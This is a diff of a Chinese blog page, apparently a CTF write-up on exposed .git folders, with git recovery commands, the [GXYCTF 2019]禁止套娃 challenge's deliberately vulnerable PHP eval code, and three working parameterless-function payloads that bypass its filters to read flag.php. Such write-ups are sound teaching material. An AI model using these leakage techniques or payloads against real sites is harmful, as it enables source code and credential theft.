@@ -177,18 +177,135 @@
     <div class="article-meta">
       <a href="/2022/07/16/git%E6%B3%84%E9%9C%B2/" class="article-date">
   <time datetime="2022-07-16T09:40:05.000Z" itemprop="datePublished">2022-07-16</time>
-</a>  
+</a> 
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E6%BC%8F%E6%B4%9E/">漏洞</a>
+  </div>
+ 
     </div>
       
     <div class="article-entry" itemprop="articleBody">
        
-  <h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p>[GXYCTF 2019]禁止套娃</p>
+  <h1 id="git泄露"><a href="#git泄露" class="headerlink" title="git泄露"></a>git泄露</h1><h2 id="1-漏洞介绍"><a href="#1-漏洞介绍" class="headerlink" title="1.漏洞介绍"></a>1.漏洞介绍</h2><p>当前大量开发人员使用git进行版本控制，对站点自动部署。如果配置不当，可能会将.git文件夹直接部署到线上环境。这就引起了git泄露漏洞。</p>
+<p>攻击者可以利用该漏洞下载git文件夹里的所有内容。如果文件夹内有敏感信息比如站点源码、数据库账户密码等，攻击者可能直接控制服务器。渗透测试人员、攻击者可以进一步代码审计、挖掘文件上传，sql注入等安全漏洞。</p>
+<h2 id="2-对于git泄露一些常见的操作"><a href="#2-对于git泄露一些常见的操作" class="headerlink" title="2.对于git泄露一些常见的操作"></a>2.对于git泄露一些常见的操作</h2><p>以githack工具为例，扫描成功后githack会生成一个文件夹dist，里面存放着重新生成的文件。</p>
+<p>进入文件夹：</p>
+<ul>
+<li>注：git作为一个版本控制工具，会记录每次提交的修改。每次提交时，git会生成相应的时间线，这个时间线是一个分支。git可以有多条分支。如果没有新建则只有一条，git默认分支为master。</li>
+</ul>
+<p>//</p>
+<pre><code>git log -all 或 git branch -v  只能查看master分支的信息
+git reflog    可以看到一些checkout记录从而发现其他分支。
+
+注：wget 是一个从网络上自动下载文件的自由工具
+wget url(我们可以通过这种方式去下载初默认分支以外的head信息)
+eg.把secret分支的head信息，保存到.git/refs/heads/secret中
+    执行：wget http://xxxxx/.git/refs/heads/secret
+
+git回滚：
+git reset  回复以前的版本
+git reset --hard HEAD^ 跳到上一个版本
+（在git中HEAD表示当前版本，上一个版本是HEAD^）
+</code></pre>
+<h2 id="3-对于git泄露的尝试、利用和工具推荐"><a href="#3-对于git泄露的尝试、利用和工具推荐" class="headerlink" title="3.对于git泄露的尝试、利用和工具推荐"></a>3.对于git泄露的尝试、利用和工具推荐</h2><p>可以对目标网站进行扫描如果访问到带.git后缀的网址一般存在git泄露。</p>
+<p>CTF线上比赛往往会有重定向一类问题。例如，只要访问git,便会返回403，此时试探访问.git/config，如果有文件返回，就说明存在git泄露，反之，一般不存在。</p>
+<p>除了查看源码，泄露的git中也有可能有其他有用的信息，如.git/config文件夹中可能含有access_token信息，从而可以访问这个用户等等其他仓库。</p>
+<ul>
+<li>git泄露常用工具：githack、scrabble、git_extract。</li>
+</ul>
+<h2 id="4-例题"><a href="#4-例题" class="headerlink" title="4.例题"></a>4.例题</h2><p>[GXYCTF 2019]禁止套娃</p>
 <p>（1）题目</p>
 <pre><code>flag在哪里呢？
 </code></pre>
 <p>（2）分析</p>
 <p>我们先用dirsearch扫一下目录发现了一些含.git的目录，因此初步推测存在git泄露。</p>
 <p><img src="https://00hello00.github.io/images/posting/1.png"></p>
+<p>//本地图库</p>
+<p>接着用githack把文件下载下来。(文件没有下全，值得好好研究一下原因)</p>
+<pre><code>flag.php
+&lt;?php
+$flag = &#39;NSSCTF&#39;;
+</code></pre>
+<p>没什么用</p>
+<pre><code>index.php
+&lt;?php
+include &quot;flag.php&quot;;
+echo &quot;flag在哪里呢？&lt;br&gt;&quot;;
+if(isset($_GET[&#39;exp&#39;]))&#123;
+    if (!preg_match(&#39;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#39;, $_GET[&#39;exp&#39;])) &#123;
+        if(&#39;;&#39; === preg_replace(&#39;/[a-z,_]+\((?R)?\)/&#39;, NULL, $_GET[&#39;exp&#39;])) &#123;
+            if (!preg_match(&#39;/et|na|info|dec|bin|hex|oct|pi|log/i&#39;, $_GET[&#39;exp&#39;])) &#123;
+                // echo $_GET[&#39;exp&#39;];
+                @eval($_GET[&#39;exp&#39;]);
+            &#125;
+            else&#123;
+                die(&quot;还差一点哦！&quot;);
+            &#125;
+        &#125;
+        else&#123;
+            die(&quot;再好好想想！&quot;);
+        &#125;
+    &#125;
+    else&#123;
+        die(&quot;还想读flag，臭弟弟！&quot;);
+    &#125;
+&#125;
+// highlight_file(__FILE__);
+?&gt;
+</code></pre>
+<p>要传入一个exp的参数而且参数不能含有data:、filter:、php:、phar:这几个伪协议。</p>
+<p>preg_replace(‘/[a-z,_]+((?R)?)/‘, NULL, $_GET[‘exp’]))采用了(?R)?这种调用方式，然后exp里面的参数值全换成null，实现无参数化。</p>
+<p>(?R)引用当前表达式，后面加了?递归调用，只能匹配通过无参数的函数。</p>
+<p>过滤了et|na|info|dec|bin|hex|oct|pi|log关键字，即把一些敏感函数给过滤掉了(get,phpinfo,hex2bin,dirname……)</p>
+<ul>
+<li><p>注：(?R)，(?R)?，(?R)，(?R)+的区别</p>
+<pre><code>  首先(?R) ， (?R)+ 这两个表达式是匹配不到东西的,因为每次匹配的时候都会至少运行一次递归，无法终止，所以匹配不到任何东西。
+  (?R)?,递归0次或1次，非贪婪，只能匹配a(b())这种一层套一个函数的。
+  
+  (?R)\，递归0次或多次，贪婪，可以匹配a(b(c()d()))
+</code></pre>
+</li>
+<li><p>常用函数</p>
+<pre><code>  scandir(’.’):扫描当前目录
+  localeconv() 函数返回一包含本地数字及货币格式信息的数组。而数组第一项就是.
+  pos(),current():返回数组第一个值
+
+  //数组操作函数：
+
+  end():数组指针指向最后一位
+  next(): 数组指针指向下一位
+  array_reverse(): 将数组颠倒
+  array_rand(): 随机返回数组的键名
+  array_flip()：交换数组的键和值
+  读取文件函数
+
+  file_get_content() :因为et被ban，所以不能使用
+  readfile()
+  highlight_file()
+  show_source()
+</code></pre>
+</li>
+</ul>
+<p>payload构造：</p>
+<p>读取目录：</p>
+<pre><code>?exp=print_r(scandir(pos(localeconv())));
+</code></pre>
+<p>方法一:<br>使用使上述文件数组反转后取next位即flag.php。然后读取文件</p>
+<p>构造：</p>
+<pre><code>exp=show_source(next(array_reverse(scandir(pos(localeconv())))));
+</code></pre>
+<p>方法二:</p>
+<p>同上述方法，但方法一有局限性，只能得到数组的第二位或者倒数第二位。其他情况可以使用随机返回键名的方法(刷新几次就可以得到)：</p>
+<pre><code>exp=show_source(array_rand(array_flip(scandir(pos(localeconv())))));
+</code></pre>
+<p>方法三：</p>
+<pre><code>session_start(): 告诉PHP使用session;
+session_id(): 获取到当前的session_id值；
+手动设置cookie中PHPSESSID=flag.php；
+
+exp=show_source(session_id(session_start()));
+设置cookie中PHPSESSID=flag.php；
+</code></pre>
  
       <!-- reward -->
       
